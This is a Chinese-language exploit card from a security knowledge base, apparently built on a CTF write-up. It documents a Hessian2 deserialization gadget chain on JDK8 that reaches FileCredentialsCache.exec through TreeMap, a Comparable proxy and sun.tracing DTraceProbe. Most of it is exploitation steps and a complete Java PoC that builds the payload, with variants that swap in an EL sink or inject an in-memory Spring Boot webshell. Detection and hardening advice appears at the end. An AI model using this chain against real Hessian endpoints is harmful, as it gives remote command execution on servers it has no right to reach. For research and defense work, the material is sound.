---
id: web-java-deser-hessian-treemap-customproxy-dtraceprobe-exec
title: Hessian2 TreeMap + CustomProxy 触发 sun.tracing ProviderSkeleton/DTraceProbe 反射调用：FileCredentialsCache.exec RCE
type: scenario
domain: web
path: web/java/deserialization/hessian
technique: hessian-treemap-providerskeleton-dtraceprobe-method-invoke
aliases:
- Hessian DTraceProbe 链
- sun.tracing ProviderSkeleton gadget
- DTraceProbe uncheckedTrigger
- CustomProxy compareTo 代理
- FileCredentialsCache exec
- Hessian 反射调用链
- HKCERT CTF 2025 labyrinth
tags:
- java
- hessian
- deserialization
- gadget-chain
- treemap
- dynamic-proxy
- sun.tracing
- dtraceprobe
- method-invoke
- jdk8
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V174
  verified_at: '2026-11-06T17:05:12+08:00'
  notes: 已对照原文与20张截图核对：入口 Hessian2Input+setAllowNonSerializable(true)、hessian-lite 4.0.5、JDK8u202、CustomProxy.compareTo 校验 m3.getName() 并 super.h.invoke、ProviderSkeleton.invoke->triggerProbe->DTraceProbe.uncheckedTrigger->Method.invoke(proxy,args)、FileCredentialsCache.exec 在 doPrivileged 内 Runtime.exec、ClassFactory 黑名单拦截 java.lang.Runtime 均与截图一致；TreeMap root/right 反射构造与中序序列化顺序、PriorityQueue/EL 变体与 Direct Proxy 因 Method.signature 不匹配失败的边界均与原文一致。卡内无 sources/source_url，路径合法。未在本机复跑链。
---

## 一句话结论

当 Hessian2 入口对输入调用 `setAllowNonSerializable(true)`，且 classpath 为带 `sun.tracing` 的 JDK8 时，构造一棵内部结构被改写的 `TreeMap`（第一个 key 为命令字符串，第二个 key 为实现了 `Comparable` 的 `CustomProxy`，其 `InvocationHandler` 是 `ProviderSkeleton` 子类），反序列化时 `map.put` 会触发 `compareTo → invoke → triggerProbe → DTraceProbe.uncheckedTrigger → Method.invoke`，最终反射调用 `sun.security.krb5.internal.ccache.FileCredentialsCache.exec(String)` 执行任意命令。

## 原理

- **入口**：Hessian 的 `MapDeserializer.doReadMap` 对每个键值对执行 `map.put(key, value)`。`TreeMap.put` 在没有 comparator 时调用 `((Comparable) key).compareTo(...)`；如果 key 是实现了 `Comparable` 的代理对象，`compareTo` 会分派到其 `InvocationHandler.invoke(proxy, Method(compareTo), args)`。
- **TreeMap 的构造**：`TreeMap` 序列化按中序遍历（左-根-右）。用反射构造 `size=2`、`root=Entry(params,1,null)`、`root.right=Entry(proxy,2,root)` 的树：序列化时先输出根 key（命令字符串），再输出右子 key（代理）；反序列化时先 `put(params, ...)` 建立根，再 `put(proxy, ...)`，此时代理的 `compareTo` 被调用，参数正是根 key（命令字符串）。
- **CustomProxy**：题目提供的类 `extends java.lang.reflect.Proxy implements Comparable<Object>`，字段 `Method m3`；`compareTo(o)` 先校验 `m3.getName()` 为 `compareTo`，再执行 `super.h.invoke(this, m3, new Object[]{o})`。`m3` 必须是 `Comparable.compareTo(Object)` 的 `Method` 对象。
- **Handler**：`sun.tracing.ProviderSkeleton` 实现 `InvocationHandler` 与 `Provider`，其 `invoke(proxy, method, args)` 取 `method.getDeclaringClass()`；当它等于可控字段 `providerType` 时调用 `triggerProbe(method, args)`，否则直接 `method.invoke(this, args)`。把 `providerType` 设为 `Comparable.class`、`active=true`，`probes` 设为 `{Comparable.compareTo 的 Method: DTraceProbe}`，即可进入触发分支。
- **DTraceProbe**：`ProviderSkeleton.triggerProbe` 在 `active` 为真时执行 `probes.get(method).uncheckedTrigger(args)`；`sun.tracing.dtrace.DTraceProbe.uncheckedTrigger` 直接 `implementing_method.invoke(proxy, args)`，`proxy` 与 `implementing_method` 都是可控字段，因此变成任意方法反射调用。
- **Sink 选择**：`sun.security.krb5.internal.ccache.FileCredentialsCache.exec(String)` 把字符串按空白切分后调用 `Runtime.getRuntime().exec(tokens)`（在 `AccessController.doPrivileged` 内）。Hessian 的 `ClassFactory` 黑名单会拦截 `java.lang.Runtime`（日志：`java.lang.Runtime in blacklist or not in whitelist, deserialization with type 'HashMap' instead`），但不会拦截 `FileCredentialsCache`，所以用它替代直接反序列化 `Runtime`。
- **为什么不直接用 JDK 动态代理**：文章实测 `Proxy.newProxyInstance(..., new Class[]{Comparable.class}, handler)` 走不通——反序列化后 `probes` 这个 `HashMap` 的 key（`Method`）与代理回调传入的 `Method` 在 `signature` 字段上不同（一侧为 `null`，另一侧为 `"(TT;)"`），`HashMap.getNode` 的 `hash`/`equals` 不匹配返回 null，`triggerProbe` 取不到 `DTraceProbe`。`CustomProxy` 把同一个 `Method` 对象随对象图一起反序列化，字段一致，查找才成功。

## 触发条件

- 存在 Hessian2 反序列化入口（如 Spring Controller 中 `new Hessian2Input(is).readObject()`），且输入侧 `SerializerFactory.setAllowNonSerializable(true)` 已开启；否则非 `Serializable` 的 `CustomProxy`、`TreeMap$Entry`、`Method`、`DTraceProbe` 等无法正常序列化/反序列化。
- JDK8 环境且保留 `sun.tracing`、`sun.security.krb5.internal.ccache` 内部类（文章使用 jdk8u202）；更高 JDK 可能移除 `sun.tracing` 或受模块封装限制，需按目标验证。
- classpath 含 hessian-lite 4.0.5（文章时最新版）或同源 Hessian 实现；该版本黑名单只覆盖部分危险类，未覆盖本链。
- 目标能实例化题目提供的 `CustomProxy` 类（或存在等价的、实现 `Comparable` 且把调用委托给 `InvocationHandler` 的代理类）。
- 已能构造任意对象图并序列化（本地有对应类与反射工具）。

## 利用步骤

1. 确认入口与配置：`POST /deserialize` 直接 `Hessian2Input.readObject()`，且 `setAllowNonSerializable(true)`；用简单对象验证 Hessian 版本与包名（hessian-lite 为 `com.alibaba.com.caucho.hessian.io.*`）。
2. 取 `Method compareTo = Comparable.class.getDeclaredMethod("compareTo", Object.class)`；取 sink `Method exec = FileCredentialsCache.class.getDeclaredMethod("exec", String.class)` 并 `setAccessible(true)`。
3. 反射构造 `DTraceProbe`，设置 `proxy=FileCredentialsCache.class`、`implementing_method=exec`。
4. 反射构造 `ProviderSkeleton` 的具体子类（`NullProvider`/`MultiplexProvider` 等，均未重写 `invoke`），设置 `active=true`、`providerType=Comparable.class`、`probes=HashMap{compareTo: dTraceProbe}`。
5. `new CustomProxy(handler, compareTo)` 作为第二个 key；用反射构造 `TreeMap`（`size=2`，`root=Entry(cmd,1,null)`，`root.right=Entry(proxy,2,root)`）。
6. 用 `Hessian2Output`（同样 `setAllowNonSerializable(true)`）序列化并发送；服务端 `map.put` 触发整条链，`FileCredentialsCache.exec(cmd)` 执行命令。
7. 若目标不出网，可把 sink 换成 `javax.el.ELProcessor.eval(String)`，用 EL 表达式执行命令或注入 Spring Boot 内存马。

## PoC

精简 payload（`createWithoutConstructor`/`setFieldValue` 为反射工具，分别用于绕过构造器与写字段）：

```java
import com.alibaba.com.caucho.hessian.io.Hessian2Input;
import com.alibaba.com.caucho.hessian.io.Hessian2Output;
import org.example.labyrinth.model.CustomProxy;
import java.io.*;
import java.lang.reflect.*;
import java.util.*;
import sun.security.krb5.internal.ccache.FileCredentialsCache;
import static cn.org.qwen.Util.createWithoutConstructor;
import static cn.org.qwen.Util.setFieldValue;

public class Exp {
    public static void main(String[] args) throws Exception {
        Method compareTo = Comparable.class.getDeclaredMethod("compareTo", Object.class);
        Method exec = FileCredentialsCache.class.getDeclaredMethod("exec", String.class);
        exec.setAccessible(true);

        Object probe = createWithoutConstructor(Class.forName("sun.tracing.dtrace.DTraceProbe"));
        setFieldValue(probe, "proxy", FileCredentialsCache.class);
        setFieldValue(probe, "implementing_method", exec);

        HashMap<Object, Object> probes = new HashMap<>();
        probes.put(compareTo, probe);

        InvocationHandler handler = (InvocationHandler)
                createWithoutConstructor(Class.forName("sun.tracing.MultiplexProvider"));
        setFieldValue(handler, "active", true);
        setFieldValue(handler, "providerType", Comparable.class);
        setFieldValue(handler, "probes", probes);

        Object proxy = new CustomProxy(handler, compareTo);
        TreeMap<Object, Object> treeMap = MyTreeMap(proxy, "calc");
        deser(treeMap);
    }

    public static TreeMap<Object, Object> MyTreeMap(Object proxy, Object params) throws Exception {
        Class<?> e = Class.forName("java.util.TreeMap$Entry");
        Constructor<?> c1 = e.getDeclaredConstructor(Object.class, Object.class, e);
        c1.setAccessible(true);
        Object root = c1.newInstance(params, 1, null);

        Constructor<?> c2 = e.getDeclaredConstructor(Object.class, Object.class, e);
        c2.setAccessible(true);
        Object right = c2.newInstance(proxy, 2, root);

        TreeMap<Object, Object> t = new TreeMap<>();
        Field size = TreeMap.class.getDeclaredField("size"); size.setAccessible(true); size.set(t, 2);
        Field rootF = TreeMap.class.getDeclaredField("root"); rootF.setAccessible(true); rootF.set(t, root);
        Field rightF = e.getDeclaredField("right"); rightF.setAccessible(true); rightF.set(root, right);
        return t;
    }

    public static void deser(Object o) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output out = new Hessian2Output(baos);
        out.getSerializerFactory().setAllowNonSerializable(true);
        out.writeObject(o); out.flush(); out.close();

        Hessian2Input in = new Hessian2Input(new ByteArrayInputStream(baos.toByteArray()));
        in.getSerializerFactory().setAllowNonSerializable(true);
        in.readObject();
    }
}
```

`sink` 换成 EL 注入的变体：把 `probe` 的 `proxy` 设为 `javax.el.ELProcessor` 实例、`implementing_method` 设为 `eval(String)`，命令参数改为 EL 表达式（文章示例用 `ScriptEngineManager` 取 JavaScript 引擎再 `Runtime.exec`）。

## 变体与关联

- **Handler 变体**：`sun.tracing` 下 `DTraceProvider`、`NullProvider`、`MultiplexProvider`、`PrintStreamProvider` 都继承 `ProviderSkeleton` 且不重写 `invoke`，任选其一即可；文章最终用 `MultiplexProvider`，demo 用 `NullProvider`。
- **触发容器变体**：`PriorityQueue` 同样可行——反射设置 `size=2`、`queue=new Object[]{cmd, proxy}`，反序列化时堆化/比较会触发代理 `compareTo`；注意队列顺序是先命令字符串、后代理。已有一个 `TreeMap` 入口卡 [[web-java-deser-hessian-deserialization-entry-map-put]] 可作为入口原理参考。
- **Sink 变体**：用 CodeQL 查 JDK 中“方法名 exec、单参数”的方法（`Runtime.exec`、`NativeRegExp.exec`、`FileCredentialsCache.exec`），逐个看能否直达命令执行；`NativeRegExp.exec` 未发现可用点，`FileCredentialsCache.exec` 直接可用。
- **失败变体**：直接使用 `java.lang.reflect.Proxy` 会因 `Method.signature` 字段差异导致 `probes` 查找失败；需要题目提供的 `CustomProxy` 或另一个能保留同一 `Method` 对象/字段的 `Comparable` 代理类。
- 关联：[[web-java-deser-hessian-spring-proxy-invocationhandler-jndi]]（同样以 TreeMap+代理进 `InvocationHandler`，但 handler/sink 为 Spring→JNDI）、[[web-java-deser-hessian-groovy-gstring-chain]]（HashMap.put 入口的 Groovy 链）。

## 检测与防御

- 关闭 Hessian 的 `setAllowNonSerializable(true)`；对反序列化使用严格类白名单，显式拒绝 `sun.tracing.*`、`sun.security.krb5.*`、`java.util.TreeMap$Entry`、`java.lang.reflect.Method` 等本链所需类型。
- 不要在没有认证/签名的情况下暴露 Hessian 入口；网关层限制 `/deserialize` 等端点，优先改用 JSON 等无多态反序列化的协议。
- 检测：Hessian 二进制流中出现 `sun.tracing.ProviderSkeleton`、`sun.tracing.dtrace.DTraceProbe`、`sun.tracing.MultiplexProvider`、`CustomProxy`、`FileCredentialsCache` 等类名字符串；监控 `FileCredentialsCache.exec`/`Runtime.exec` 的异常调用栈（栈中含 Hessian `MapDeserializer`/`TreeMap.put` 是强特征）。
- 运行环境：升级到移除 `sun.tracing` 或强封装内部 API 的 JDK；在 JDK8 上可通过自定义 `ObjectInputFilter`/Hessian `SerializerFactory` 黑名单补充拦截。
